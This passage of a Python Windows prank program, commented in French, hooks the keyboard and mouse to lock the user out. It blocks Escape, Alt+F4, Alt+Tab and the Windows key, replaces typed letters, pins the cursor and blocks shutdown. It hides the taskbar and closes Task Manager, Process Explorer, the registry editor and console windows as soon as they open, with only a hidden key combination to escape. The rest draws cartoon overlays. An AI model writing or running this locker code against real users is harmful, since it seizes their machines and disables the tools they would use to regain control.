            if remote_control_active and not (flags & 0x00000010):
                return 1

            # Clavier farceur (Prank keyboard keys) - Intercepter et remplacer les lettres avec animation hyper-réaliste
            if prank_keys_active and not (flags & 0x00000010):
                if 0x41 <= vk <= 0x5A:  # Touches A-Z
                    if wParam in (256, 260):  # keydown
                        user_char = chr(vk)
                        vowels = [0x41, 0x45, 0x49, 0x4F, 0x55] # A, E, I, O, U
                        # Garantir que la touche substituée est TOUJOURS différente de la touche choisie par l'utilisateur
                        other_vowels = [v for v in vowels if v != vk]
                        vowel = random.choice(other_vowels) if other_vowels else (0x45 if vk != 0x45 else 0x4F)
                        replaced_char = chr(vowel)
                        ctypes.windll.user32.keybd_event(vowel, 0, 0, 0)
                        ctypes.windll.user32.keybd_event(vowel, 0, 2, 0)
                        if keys_overlay_instance is not None:
                            try:
                                keys_overlay_instance.trigger_key_swap(user_char, replaced_char)
                            except Exception:
                                pass
                    return 1  # Bloquer l'événement d'origine
                
            # Détecter le spam clavier (au moins 10 touches en moins de 1.0 seconde)
            if wParam == 256 and mouse_locked and not spam_window_active:
                if not (flags & 0x00000010):  # Ignorer les touches simulées par le programme
                    now = time.time()
                    blocked_key_times.append(now)
                    blocked_key_times = [t for t in blocked_key_times if now - t <= 1.0]
                    if len(blocked_key_times) >= 10:
                        spam_window_active = True
                        threading.Thread(target=run_spam_troll_sequence, daemon=True).start()

            # Echap - traitement des tentatives normales de sortie
            if vk == 0x1B:
                # Bloquer les combinaisons avec Echap uniquement sur appui (WM_KEYDOWN = 256, WM_SYSKEYDOWN = 260)
                if wParam in (256, 260):
                    if is_ctrl_pressed and is_shift_pressed:
                        _safe_troll("task_manager")
                    elif is_ctrl_pressed:
                        pass
                    elif is_alt_pressed:
                        pass
                    else:
                        escape_attempt_count += 1
                        _safe_troll("escape")
                return 1
            
            # Détection de techniques de sortie spécifiques sur appui (WM_KEYDOWN = 256, WM_SYSKEYDOWN = 260)
            is_key_down = (wParam == 256 or wParam == 260)
            alt_down = (flags & 0x20) != 0
            
            if is_key_down:
                # Alt + F4
                if vk == 0x73 and alt_down:
                    alt_f4_attempt_count += 1
                    _safe_troll("alt_f4")
                    return 1
                # Alt + Tab
                elif vk == 0x09 and alt_down:
                    alt_tab_attempt_count += 1
                    _safe_troll("alt_tab")
                    return 1
                # Touche Windows LWIN / RWIN (bloque TOUTES les combos Win+X)
                elif vk in (0x5B, 0x5C):
                    win_key_attempt_count += 1
                    _safe_troll("win_key")
                    return 1
                # F11 (Plein écran navigateur, etc.)
                elif vk == 0x7A:
                    return 1
                # PrintScreen
                elif vk == 0x2C:
                    return 1
                    
            # Bloquer toutes les autres entrees physiques si le verrouillage du protocole, le BSOD ou le controle a distance est actif
            if (mouse_locked or bsod_window is not None or remote_control_active) and not (flags & 0x00000010):
                return 1
                
        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
    except Exception as hook_err:
        try:
            with open("hook_debug.log", "a") as f:
                f.write(f"Exception dans keyboard_hook_callback: {hook_err}\n")
        except Exception:
            pass
        return 1  # En cas d'erreur, bloquer la touche par sécurité

rotate_last_phys_x = None
rotate_last_phys_y = None

def mouse_hook_callback(nCode, wParam, lParam):
    global rotate_last_phys_x, rotate_last_phys_y, screen_rotate_active, remote_control_active, dialog_is_open
    try:
        if nCode >= 0 and lParam:
            # Laisser passer les clics souris si un dialogue interactif est actif
            if dialog_is_open:
                return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
                
            mouse_info = lParam.contents
            
            # 1. Inversion de gravité (Bascule 180°) sur mouvement physique
            if screen_rotate_active and wParam == 0x0200: # WM_MOUSEMOVE
                if not (mouse_info.flags & 0x00000001): # physique
                    cx, cy = mouse_info.pt.x, mouse_info.pt.y
                    if rotate_last_phys_x is not None and rotate_last_phys_y is not None:
                        dx = cx - rotate_last_phys_x
                        dy = cy - rotate_last_phys_y
                        if dx != 0 or dy != 0:
                            cur_pt = wintypes.POINT()
                            ctypes.windll.user32.GetCursorPos(ctypes.byref(cur_pt))
                            nx = cur_pt.x - dx
                            ny = cur_pt.y - dy
                            rotate_last_phys_x = cx
                            rotate_last_phys_y = cy
                            ctypes.windll.user32.SetCursorPos(nx, ny)
                            return 1
                    rotate_last_phys_x = cx
                    rotate_last_phys_y = cy

            # 2. Bloquer les clics/mouvements physiques (LLMHF_INJECTED = 0x01 non defini) si contrôle à distance actif
            if remote_control_active and not (mouse_info.flags & 0x00000001):
                return 1
                
        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
    except Exception:
        return 0

def install_hooks():
    global keyboard_hook, mouse_hook, keyboard_hook_proc_ref, mouse_hook_proc_ref, remote_control_active, screen_rotate_active
    
    # Hook Clavier
    if not keyboard_hook:
        keyboard_hook_proc_ref = HOOKPROC(keyboard_hook_callback)
        keyboard_hook = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            keyboard_hook_proc_ref,
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
    
    # Hook Souris
    if (remote_control_active or screen_rotate_active) and not mouse_hook:
        mouse_hook_proc_ref = MOUSEHOOKPROC(mouse_hook_callback)
        mouse_hook = ctypes.windll.user32.SetWindowsHookExW(
            WH_MOUSE_LL,
            mouse_hook_proc_ref,
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )

def uninstall_hooks():
    global keyboard_hook, mouse_hook
    if keyboard_hook:
        ctypes.windll.user32.UnhookWindowsHookEx(keyboard_hook)
        keyboard_hook = None
    if mouse_hook:
        ctypes.windll.user32.UnhookWindowsHookEx(mouse_hook)
        mouse_hook = None

def update_hooks_state():
    global keyboard_hook, mouse_hook, mouse_locked, prank_keys_active, bsod_window, remote_control_active, screen_rotate_active
    
    def run_update():
        global keyboard_hook, mouse_hook, mouse_locked, prank_keys_active, bsod_window, remote_control_active, screen_rotate_active
        
        needs_kbd_hook = mouse_locked or prank_keys_active or (bsod_window is not None) or remote_control_active
        needs_mouse_hook = remote_control_active or screen_rotate_active
        
        if needs_kbd_hook and not keyboard_hook:
            install_hooks()
        elif not needs_kbd_hook and keyboard_hook:
            ctypes.windll.user32.UnhookWindowsHookEx(keyboard_hook)
            keyboard_hook = None
            
        if needs_mouse_hook and not mouse_hook:
            install_hooks()
        elif not needs_mouse_hook and mouse_hook:
            ctypes.windll.user32.UnhookWindowsHookEx(mouse_hook)
            mouse_hook = None

    if root:
        try:
            root.after(0, run_update)
        except Exception:
            run_update()
    else:
        run_update()

def register_shutdown_block(hwnd, reason):
    """
    Empêche Windows de se fermer ou de se déconnecter en enregistrant une raison de blocage.
    """
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(hwnd, ctypes.c_wchar_p(reason))
    except Exception:
        pass

def unregister_shutdown_block(hwnd):
    """
    Supprime la raison de blocage de Windows.
    """
    try:
        ctypes.windll.user32.ShutdownBlockReasonDestroy(hwnd)
    except Exception:
        pass

# ==============================================================================
# 5. GESTION DU VERROUILLAGE SOURIS ET DU REPLI DE FOCUS (THREADS)
# ==============================================================================

def make_window_topmost(hwnd):
    """
    Rend une fenêtre topmost (toujours au premier plan).
    """
    try:
        # HWND_TOPMOST = -1, SWP_NOMOVE = 0x0002, SWP_NOSIZE = 0x0001
        ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001)
    except Exception:
        pass

def is_window_really_valid(hwnd, titles):
    """
    Vérifie si le handle de fenêtre est valide et si son titre contient l'un des mots-clés.
    """
    if not hwnd or not ctypes.windll.user32.IsWindow(hwnd):
        return False
    try:
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            title = buf.value.lower()
            for t in titles:
                if t in title:
                    return True
    except Exception:
        pass
    return False

def force_foreground(hwnd):
    """
    Force une fenêtre au premier plan en gérant les restrictions de focus de Windows.
    """
    try:
        ctypes.windll.user32.SetForegroundWindow(hwnd)
        fore_thread = ctypes.windll.user32.GetWindowThreadProcessId(ctypes.windll.user32.GetForegroundWindow(), None)
        target_thread = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
        if fore_thread != target_thread:
            ctypes.windll.user32.AttachThreadInput(fore_thread, target_thread, True)
            ctypes.windll.user32.SetForegroundWindow(hwnd)
            ctypes.windll.user32.AttachThreadInput(fore_thread, target_thread, False)
        ctypes.windll.user32.ShowWindow(hwnd, 9)  # SW_RESTORE
    except Exception:
        pass

class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

def get_mouse_position():
    pt = POINT()
    ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
    return pt.x, pt.y

def lock_mouse_loop():
    """
    Maintient le curseur au centre de l'écran en utilisant l'API native Windows SetCursorPos.
    """
    global mouse_locked, mouse_fight_count
    
    try:
        # Utiliser GetSystemMetrics pour une récupération 100% thread-safe sans toucher à Tkinter
        screen_width = ctypes.windll.user32.GetSystemMetrics(0)  # SM_CXSCREEN
        screen_height = ctypes.windll.user32.GetSystemMetrics(1) # SM_CYSCREEN
        center_x, center_y = screen_width // 2, screen_height // 2
    except Exception:
        center_x, center_y = 960, 540
        
    while mouse_locked:
        x, y = get_mouse_position()
        
        if abs(x - center_x) > 15 or abs(y - center_y) > 15:
            mouse_fight_count += 1
            
        try:
            ctypes.windll.user32.SetCursorPos(center_x, center_y)
        except Exception:
            pass
        time.sleep(0.001)

def _safe_set_topmost(topmost_val):
    """Change le mode topmost de root de façon thread-safe via root.after()."""
    try:
        if root:
            root.after(0, lambda v=topmost_val: _apply_topmost(v))
    except Exception:
        pass

def _apply_topmost(val):
    try:
        root.attributes("-topmost", val)
    except Exception:
        pass

def focus_monitor_loop():
    """
    Surveille en temps réel la fenêtre au premier plan.
    TOUTES les opérations Tkinter passent par root.after() pour la thread-safety.
    """
    global mouse_locked, current_allowed_hwnd, alt_tab_attempt_count, tkinter_hwnd, is_launching, root, dialog_is_open
    global task_manager_attempt_count, focus_loss_attempt_count, spam_hwnd, spam_window_active
    while mouse_locked:
        try:
            # Sécurité : Arrêt d'urgence global avec Ctrl+Shift+Alt + (Q, Echap ou F12)
            if (ctypes.windll.user32.GetAsyncKeyState(0x51) & 0x8000) or \
               (ctypes.windll.user32.GetAsyncKeyState(0x1B) & 0x8000) or \
               (ctypes.windll.user32.GetAsyncKeyState(0x7B) & 0x8000):
                ctrl_down = ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000
                shift_down = ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000
                alt_down = ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000
                if ctrl_down and shift_down and alt_down:
                    instant_emergency_kill("focus_monitor_loop (backdoor combo)")
                
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            
            # Obtenir le nom de classe
            class_buf = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetClassNameW(hwnd, class_buf, 256)
            class_name = class_buf.value
            
            # Détection du menu Win+X (CoreWindow/ContextMenu) ou de la barre des tâches
            is_system_menu = class_name in ("Windows.UI.Core.CoreWindow", "Shell_TrayWnd", "NotifyIconOverflowWindow", "DV2ControlHost")
            
            # Détection du Gestionnaire des tâches et autres outils de surveillance/configuration
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            title = ""
            if length > 0:
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                title = buf.value.lower()
                
            is_task_mgr = False
            if ("taskmanager" in class_name.lower()) or ("task manager" in title) or ("gestionnaire des t" in title):
                is_task_mgr = True
            elif ("process explorer" in title) or ("procexp" in title) or ("procexp" in class_name.lower()):
                is_task_mgr = True
            elif ("process hacker" in title) or ("processhacker" in class_name.lower()):
                is_task_mgr = True
            elif ("registry editor" in title) or ("editeur de registre" in title) or ("regedit" in class_name.lower()):
                is_task_mgr = True
            elif ("msconfig" in title) or ("configuration du systeme" in title):
                is_task_mgr = True
            elif class_name in ("ConsoleWindowClass", "WindowClass_1", "CASCADIA_HOSTING_WINDOW_CLASS"):
                try:
                    my_console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                except Exception:
                    my_console_hwnd = 0
                if hwnd != my_console_hwnd:
                    is_task_mgr = True
            
            if is_task_mgr:
                # Fermer immédiatement la fenêtre non autorisée (WM_CLOSE = 0x0010)
                try:
                    ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
                except Exception:
                    pass
                task_manager_attempt_count += 1
                _safe_troll("task_manager")
            
            # Gestion dynamique du mode topmost de root — 100% thread-safe via root.after()
            if root:
                if is_launching or dialog_is_open or len(active_troll_hwnds) > 0:
                    _safe_set_topmost(False)
                elif spam_window_active:
                    _safe_set_topmost(False)
                elif current_allowed_hwnd and current_allowed_hwnd != tkinter_hwnd:
                    _safe_set_topmost(False)
                else:
                    _safe_set_topmost(True)
   
            # Déterminer si le focus actuel est sur une fenêtre autorisée
            allowed_hwnds = [tkinter_hwnd]
            if current_allowed_hwnd:
                allowed_hwnds.append(current_allowed_hwnd)
            if spam_hwnd:
                allowed_hwnds.append(spam_hwnd)
            for th in active_troll_hwnds:
                allowed_hwnds.append(th)
            
            if hwnd not in allowed_hwnds and not dialog_is_open and not is_launching and not is_task_mgr:
                # Si un menu système s'ouvre, on envoie Escape pour le refermer
                if is_system_menu:
                    try:
                        ctypes.windll.user32.keybd_event(0x1B, 0, 0, 0)
                        ctypes.windll.user32.keybd_event(0x1B, 0, 2, 0)
                        time.sleep(0.05)
                    except Exception:
                        pass
                else:
                    focus_loss_attempt_count += 1
                    _safe_troll("focus_loss")
                
                # Forcer le focus sur la fenêtre appropriée
                if active_troll_hwnds:
                    restore_hwnd = list(active_troll_hwnds)[-1]
                else:
                    restore_hwnd = spam_hwnd if (spam_hwnd and spam_window_active) else (current_allowed_hwnd if current_allowed_hwnd else tkinter_hwnd)
                
                if restore_hwnd:
                    try:
                        ctypes.windll.user32.SetForegroundWindow(restore_hwnd)
                    except Exception:
                        pass
                elif tkinter_hwnd:
                    try:
                        ctypes.windll.user32.SetForegroundWindow(tkinter_hwnd)
                    except Exception:
                        pass
        except Exception:
            pass
                    
        time.sleep(0.02)

def watchdog_loop():
    """
    Surveille en temps réel que les fenêtres autorisées ne sont pas minimisées.
    TOUTES les opérations Tkinter passent par root.after() pour la thread-safety.
    """
    global mouse_locked, current_allowed_hwnd, cmd_window, notepad_window
    while mouse_locked:
        if is_launching:
            time.sleep(0.1)
            continue
        
        try:
            # Planifier la vérification/restauration dans le thread GUI
            if root:
                root.after(0, _watchdog_check)
        except Exception:
            pass
            
        time.sleep(0.15)

def _watchdog_check():
    """Vérification de minimisation — exécutée dans le thread GUI via root.after()."""
    try:
        if current_allowed_hwnd == cmd_hwnd and cmd_window and cmd_window.winfo_exists():
            if cmd_window.state() == "iconic":
                cmd_window.deiconify()
                cmd_window.lift()
        elif current_allowed_hwnd == notepad_hwnd and notepad_window and notepad_window.winfo_exists():
            if notepad_window.state() == "iconic":
                notepad_window.deiconify()
                notepad_window.lift()
    except Exception:
        pass

def set_taskbar_visibility(visible):
    """
    Masque ou affiche les barres des tâches Windows (principale et secondaires).
    visible = True (pour afficher), False (pour masquer).
    """
    try:
        cmd = 5 if visible else 0  # 5 = SW_SHOW, 0 = SW_HIDE
        
        # Barre des tâches principale
        h_taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if h_taskbar:
            ctypes.windll.user32.ShowWindow(h_taskbar, cmd)
            
        # Bouton Démarrer
        h_start = ctypes.windll.user32.FindWindowW("Button", None)
        if h_start:
            ctypes.windll.user32.ShowWindow(h_start, cmd)
            
        # Barres des tâches secondaires (multi-écrans)
        h_sec_taskbar = ctypes.windll.user32.FindWindowW("Shell_SecondaryTrayWnd", None)
        if h_sec_taskbar:
            ctypes.windll.user32.ShowWindow(h_sec_taskbar, cmd)
            
    except Exception:
        pass

# ==============================================================================
# TROLLS AVANCÉS - LOGIQUE ET BOUCLES D'EFFETS
# ==============================================================================

class MOUSE_POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

def _get_current_mouse_position():
    pt = MOUSE_POINT()
    ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
    return pt.x, pt.y

# ==============================================================================
# OVERLAYS CARTOON POUR LES FARCES SOURIS (DÉRIVE, IVRE, MUR)
# ==============================================================================
puller_state = {"active": False, "mx": 0, "my": 0, "dir_x": 1.0, "dir_y": 0.0, "force": 0.0}
drunk_state = {"active": False, "mx": 0, "my": 0, "drinking": False, "intro_reset": False}
wall_state = {"active": False, "mx": 0, "my": 0, "is_bonking": False, "wall_x": 0}
painter_state = {"active": False}
keys_state = {"active": False, "last_key_time": 0.0, "key_char": "A"}
ghost_state = {"active": False, "booh": False}
tts_state = {"active": False, "is_speaking": False, "text": ""}
rotate_state = {"active": False, "angle": 0.0}
monkey_state = {"active": False}

puller_overlay_instance = None
drunk_overlay_instance = None
wall_overlay_instance = None
painter_overlay_instance = None
keys_overlay_instance = None
ghost_overlay_instance = None
tts_overlay_instance = None
rotate_overlay_instance = None
monkey_overlay_instance = None

def _shake_window_briefly(hwnd, orig_x, orig_y):
    try:
        for s in [7, -7, 6, -6, 4, -4, 2, -2, 0]:
            ctypes.windll.user32.SetWindowPos(hwnd, 0, orig_x + s, orig_y, 0, 0, 0x0001 | 0x0004 | 0x0010)
            time.sleep(0.02)
    except Exception:
        pass

class CartoonPullerOverlay:
    """
    Bonhomme cartoon musclé qui attrape la souris avec une corde et la tracte
    vers l'avant en courant (sens physique et graphique 100% cohérent : court en avant,
    incliné dans le sens de la traction, corde tendue vers l'arrière reliée à la souris,
    nuages de poussière, sueur et rubans propulsés vers l'arrière).
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        # Dimensions généreuses pour contenir le coureur, la corde entière et la souris
        self.w, self.h = 440, 280
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.last_wx = None
        self.last_wy = None
        self.phase = 0.0
        self.facing = 1.0 # 1.0 = court vers la droite, -1.0 = court vers la gauche
        self.sweat_drops = []
        self.dust_puffs = []
        self.visible = False
        self.speech_timer = 0
        self.speech_text = "HO-ISSE ! 🏃‍♂️💨"
        self._loop_active = True
        self._tick()
        
    def _tick(self):
        if not self._loop_active:
            return
        try:
            global puller_state
            if puller_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    
                mx = puller_state.get("mx", 0)
                my = puller_state.get("my", 0)
                dx = puller_state.get("dir_x", 1.0)
                dy = puller_state.get("dir_y", 0.0)
                
                self.phase += 0.35
                if dx > 1.2:
                    self.facing = 1.0
                elif dx < -1.2:
                    self.facing = -1.0
                    
                # Le bonhomme est positionné EN AVANT de la souris dans le sens du mouvement
                dist_ahead = 135
                char_screen_x = mx + int(self.facing * dist_ahead)
                char_screen_y = my - 12
                
                # Fenêtre overlay centrée précisément sur l'ensemble souris + coureur
                center_x = (mx + char_screen_x) // 2
                center_y = (my + char_screen_y) // 2
                
                wx = int(center_x - (self.w // 2))
                wy = int(center_y - (self.h // 2))
                
                if (wx, wy) != (self.last_wx, self.last_wy):
                    self.last_wx = wx
                    self.last_wy = wy
                    if self.hwnd:
                        ctypes.windll.user32.SetWindowPos(
                            self.hwnd, 0, wx, wy, 0, 0,
                            0x0001 | 0x0004 | 0x0010
                        )
                    else:
                        self.win.geometry(f"{self.w}x{self.h}+{wx}+{wy}")
                        
                canvas_mx = mx - wx
                canvas_my = my - wy
                canvas_cx = char_screen_x - wx
                canvas_cy = char_screen_y - wy
                
                self._draw(canvas_cx, canvas_cy, canvas_mx, canvas_my)
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                    self.sweat_drops.clear()
                    self.dust_puffs.clear()
                    self.last_wx = None
                    self.last_wy = None
        except Exception:
            pass
        if self.master:
            self.master.after(20, self._tick)
            
    def _draw(self, cx, cy, mx, my):
        self.canvas.delete("all")
        facing = self.facing
        
        # 1. Poussière de course / dérapage projetée en ARRIÈRE du mouvement (-facing)
        if random.random() < 0.45:
            self.dust_puffs.append({
                "x": cx - (facing * 28) + random.uniform(-10, 10),
                "y": cy + 58 + random.uniform(-4, 4),
                "vx": -facing * random.uniform(2.5, 5.5),
                "vy": random.uniform(-2.2, 0.4),
                "r": random.uniform(5.5, 9.5),
                "life": 1.0
            })
            
        new_dust = []
        for d in self.dust_puffs:
            d["x"] += d["vx"]
            d["y"] += d["vy"]
            d["r"] += 0.8
            d["life"] -= 0.08
            if d["life"] > 0:
                self.canvas.create_oval(d["x"] - d["r"], d["y"] - d["r"]*0.7, d["x"] + d["r"], d["y"] + d["r"]*0.7, fill="#64748b", outline="")
                new_dust.append(d)
        self.dust_puffs = new_dust
        
        # 2. Lignes de vitesse cartoon projetées en arrière (-facing)
        for l in range(3):
            ly = cy - 20 + l * 24
            lx_start = cx - facing * 35
            lx_end = cx - facing * (75 + math.sin(self.phase + l) * 14)
            self.canvas.create_line(lx_start, ly, lx_end, ly, fill="#cbd5e1", width=2, dash=(4, 2))
            
        # (Ombre au sol sous le coureur supprimée)
        
        # 3. Cycle de course effréné des jambes cartoon
        stride = math.sin(self.phase * 1.8) * 26.0
        leg_lift_f = max(0.0, math.cos(self.phase * 1.8)) * 18.0
        leg_lift_b = max(0.0, -math.cos(self.phase * 1.8)) * 18.0
        
        hip_x = cx - facing * 6
        hip_y = cy + 16
        
        # Jambe avant (attaque vers l'avant dans le sens facing)
        foot_front_x = hip_x + (facing * 22) + (facing * stride)
        foot_front_y = cy + 58 - leg_lift_f
        knee_front_x = (hip_x + foot_front_x) / 2.0 + (facing * 10)
        knee_front_y = (hip_y + foot_front_y) / 2.0 - 6
        
        # Jambe arrière (pousse vers l'arrière)
        foot_back_x = hip_x - (facing * 20) - (facing * stride)
        foot_back_y = cy + 58 - leg_lift_b
        knee_back_x = (hip_x + foot_back_x) / 2.0 - (facing * 8)
        knee_back_y = (hip_y + foot_back_y) / 2.0 - 6
        
        # Rendu pantalon d'effort bleu sportif
        self.canvas.create_line(hip_x, hip_y, knee_back_x, knee_back_y, fill="#0f172a", width=14, capstyle=tk.ROUND)
        self.canvas.create_line(hip_x, hip_y, knee_back_x, knee_back_y, fill="#1d4ed8", width=9, capstyle=tk.ROUND)
        self.canvas.create_line(knee_back_x, knee_back_y, foot_back_x, foot_back_y, fill="#0f172a", width=13, capstyle=tk.ROUND)
        self.canvas.create_line(knee_back_x, knee_back_y, foot_back_x, foot_back_y, fill="#1d4ed8", width=8, capstyle=tk.ROUND)
        
        self.canvas.create_line(hip_x, hip_y, knee_front_x, knee_front_y, fill="#0f172a", width=14, capstyle=tk.ROUND)
        self.canvas.create_line(hip_x, hip_y, knee_front_x, knee_front_y, fill="#2563eb", width=9, capstyle=tk.ROUND)
        self.canvas.create_line(knee_front_x, knee_front_y, foot_front_x, foot_front_y, fill="#0f172a", width=13, capstyle=tk.ROUND)
        self.canvas.create_line(knee_front_x, knee_front_y, foot_front_x, foot_front_y, fill="#2563eb", width=8, capstyle=tk.ROUND)
        
        # Baskets de sport cartoon rouges à semelles blanches
        for fx, fy in [(foot_back_x, foot_back_y), (foot_front_x, foot_front_y)]:
            self.canvas.create_oval(fx - 14, fy + 2, fx + 14, fy + 9, fill="#f8fafc", outline="#0f172a", width=2)
            self.canvas.create_polygon([
                fx - facing * 12, fy + 3,
                fx + facing * 16, fy + 3,
                fx + facing * 13, fy - 6,
                fx - facing * 8, fy - 9,
                fx - facing * 12, fy - 4
            ], fill="#ef4444", outline="#0f172a", width=2)
            
        # 5. Torse musclé penché EN AVANT dans la direction du mouvement
        lean_angle = facing * 30.0
        lean_rad = math.radians(lean_angle)
        bob = math.sin(self.phase * 3.6) * 3.5
        
        shoulder_x = hip_x + math.sin(lean_rad) * 44.0
        shoulder_y = hip_y - math.cos(lean_rad) * 44.0 + bob
        
        # Débardeur de sport orange vif
        self.canvas.create_line(hip_x, hip_y, shoulder_x, shoulder_y, fill="#0f172a", width=26, capstyle=tk.ROUND)
        self.canvas.create_line(hip_x, hip_y, shoulder_x, shoulder_y, fill="#ea580c", width=20, capstyle=tk.ROUND)
        self.canvas.create_line(hip_x + facing*2, hip_y - 2, shoulder_x + facing*2, shoulder_y - 2, fill="#f97316", width=8, capstyle=tk.ROUND)
        
        # 6. Bras musclés en pleine traction de la corde vers l'arrière (-facing)
        torso_cy = (hip_y + shoulder_y) / 2.0
        hands_x = hip_x - (facing * 12)
        hands_y = torso_cy + 4
        
        # Bras arrière
        self.canvas.create_line(shoulder_x - facing*5, shoulder_y + 4, hands_x - facing*6, hands_y - 4, fill="#0f172a", width=12, capstyle=tk.ROUND)
        self.canvas.create_line(shoulder_x - facing*5, shoulder_y + 4, hands_x - facing*6, hands_y - 4, fill="#fed7aa", width=8, capstyle=tk.ROUND)
        self.canvas.create_oval(shoulder_x - 8, shoulder_y - 2, shoulder_x + 8, shoulder_y + 14, fill="#fed7aa", outline="#c2410c", width=2)
        
        # Bras avant
        self.canvas.create_line(shoulder_x + facing*6, shoulder_y + 6, hands_x + facing*6, hands_y, fill="#0f172a", width=13, capstyle=tk.ROUND)
        self.canvas.create_line(shoulder_x + facing*6, shoulder_y + 6, hands_x + facing*6, hands_y, fill="#fed7aa", width=9, capstyle=tk.ROUND)
        
        # Gants de force marrons agrippant la corde
        self.canvas.create_oval(hands_x - 10, hands_y - 8, hands_x + 10, hands_y + 8, fill="#92400e", outline="#0f172a", width=2)
        self.canvas.create_oval(hands_x - 4 + facing*6, hands_y - 6, hands_x + 12 + facing*6, hands_y + 6, fill="#b45309", outline="#0f172a", width=2)
        
        # 7. Tête expressive déterminée, regardant devant vers facing
        head_x = shoulder_x + (facing * 12)
        head_y = shoulder_y - 20
        
        # Visage en sueur
        self.canvas.create_oval(head_x - 19, head_y - 19, head_x + 19, head_y + 19, fill="#fed7aa", outline="#c2410c", width=3)
        self.canvas.create_oval(head_x + facing*6 - 6, head_y + 3, head_x + facing*6 + 8, head_y + 11, fill="#fca5a5", outline="")
        
        # Yeux concentrés
        eye_x = head_x + (facing * 7)
        eye_y = head_y - 3
        self.canvas.create_oval(eye_x - 5, eye_y - 5, eye_x + 5, eye_y + 5, fill="#ffffff", outline="#0f172a", width=2)
        self.canvas.create_oval(eye_x + facing*2 - 2, eye_y - 2, eye_x + facing*2 + 2, eye_y + 2, fill="#0f172a", outline="")
        self.canvas.create_line(eye_x - facing*8, eye_y - 8, eye_x + facing*6, eye_y - 5, fill="#7c2d12", width=4)
        
        # Dents serrées de grimace d'effort
        mouth_x = head_x + (facing * 9)
        mouth_y = head_y + 9
        self.canvas.create_rectangle(mouth_x - 8, mouth_y - 4, mouth_x + 8, mouth_y + 4, fill="#ffffff", outline="#0f172a", width=2)
        self.canvas.create_line(mouth_x - 4, mouth_y - 4, mouth_x - 4, mouth_y + 4, fill="#0f172a", width=1)
        self.canvas.create_line(mouth_x + 2, mouth_y - 4, mouth_x + 2, mouth_y + 4, fill="#0f172a", width=1)
        self.canvas.create_line(mouth_x - 8, mouth_y, mouth_x + 8, mouth_y, fill="#0f172a", width=1)
        
        # Bandeau ninja rouge vif sur le front
        band_y = head_y - 10
        self.canvas.create_line(head_x - 20, band_y, head_x + 20, band_y, fill="#ef4444", width=7)
        # Rubans flottant au vent vers l'arrière (-facing)
        ribbon_wave = math.sin(self.phase * 4.5) * 8.0
        self.canvas.create_line(head_x - facing*18, band_y, head_x - facing*45, band_y - 8 + ribbon_wave, fill="#dc2626", width=4)
        self.canvas.create_line(head_x - facing*18, band_y, head_x - facing*40, band_y + 8 - ribbon_wave, fill="#b91c1c", width=4)
        
        # 8. Gouttes de sueur qui giclent vers l'arrière (-facing)
        if random.random() < 0.35:
            self.sweat_drops.append({
                "x": head_x + random.uniform(-6, 6),
                "y": head_y - 12,
                "vx": -facing * random.uniform(2.5, 6.0),
                "vy": random.uniform(-3.5, -0.5),
                "life": 1.0
            })
            
        new_sweat = []
        for s in self.sweat_drops:
            s["x"] += s["vx"]
            s["y"] += s["vy"]
            s["vy"] += 0.4
            s["life"] -= 0.1
            if s["life"] > 0:
                self.canvas.create_oval(s["x"] - 3, s["y"] - 4, s["x"] + 3, s["y"] + 4, fill="#38bdf8", outline="#0284c7", width=1)
                new_sweat.append(s)
        self.sweat_drops = new_sweat
        
        # 9. Corde nautique torsadée ultra-tendue reliant les mains à la souris (vers l'arrière -facing)
        rope_vib = math.sin(self.phase * 8.0) * 3.0
        mid_rx = (hands_x + mx) / 2.0
        mid_ry = (hands_y + my) / 2.0 + rope_vib
        
        self.canvas.create_line(hands_x, hands_y, mid_rx, mid_ry, fill="#78350f", width=6)
        self.canvas.create_line(mid_rx, mid_ry, mx, my, fill="#78350f", width=6)
        self.canvas.create_line(hands_x, hands_y, mid_rx, mid_ry, fill="#d97706", width=3, dash=(6, 3))
        self.canvas.create_line(mid_rx, mid_ry, mx, my, fill="#d97706", width=3, dash=(6, 3))
        
